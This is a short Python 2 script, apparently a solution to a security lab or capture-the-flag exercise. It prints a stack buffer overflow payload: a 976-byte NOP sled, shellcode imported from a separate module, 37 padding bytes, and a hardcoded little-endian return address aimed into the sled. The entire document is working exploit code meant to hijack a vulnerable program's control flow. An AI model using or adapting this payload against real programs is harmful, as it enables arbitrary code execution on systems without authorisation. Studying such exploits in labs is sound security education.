from shellcode import shellcode
from struct import pack

print '\x90' * 976 + shellcode + 'A' * 37 + pack('<I', 0xbffe8b48 - 0x408)
